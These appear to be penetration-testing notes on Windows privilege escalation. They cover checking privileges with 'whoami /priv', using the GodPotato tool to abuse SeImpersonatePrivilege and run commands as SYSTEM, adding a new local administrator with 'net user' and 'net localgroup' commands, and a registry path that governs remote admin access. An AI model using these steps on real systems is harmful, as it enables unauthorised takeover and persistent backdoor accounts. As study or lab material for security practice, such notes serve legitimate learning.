## User Privileges

Enumerate user privileges
`whoami /priv`
- interesting privileges 
	- SeBackupPrivilege
	- SeImpersonatePrivilege
![](assets/Pasted%20image%2020260710083811.png)

**SeImpersonatePrivilege**
[Potato](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all) exploits impersonate "NT Authority\System"
- GodPotato is easy to use an works with recent updates

Execute arbitrary commands with GodPotato
`./GodPotato.exe -cmd "<binary> <options>"`
- these commands are run with NT Authority\System

easiest solution is to create a new local admin account
`net user <user> <pass> /add`
`net localgroup Administrators <user> /add`

by default, all local administrators except "Administrator" do not get administrative access from remote
- can be disabled with the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

